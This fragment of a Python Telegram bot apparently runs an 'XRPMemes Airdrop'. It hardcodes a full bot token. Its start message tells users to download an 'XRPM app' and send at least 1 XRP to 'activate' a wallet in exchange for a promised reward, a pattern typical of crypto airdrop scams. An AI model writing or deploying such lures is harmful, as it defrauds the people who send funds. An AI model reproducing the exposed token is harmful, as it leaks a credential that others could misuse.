...
# Bot Token (Updated token)
TELEGRAM_TOKEN = "8177132911:AAF5hPhMAbizUXohRuoZgMkOV-Y1icTBLKM"
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    await update.message.reply_text(
        "🌟 *XRPMemes Airdrop Bot* 🌟\n\n"
        "*Do this simple steps to be rewarded!*\n\n"
        "*Complete these steps:*\n"
        "1️⃣ Join our Telegram group\n"
        "2️⃣ Follow us on Twitter/X\n"
        "3️⃣ Download XRPM app and Send a Minimum of 1 XRP to activate your new wallet\n"
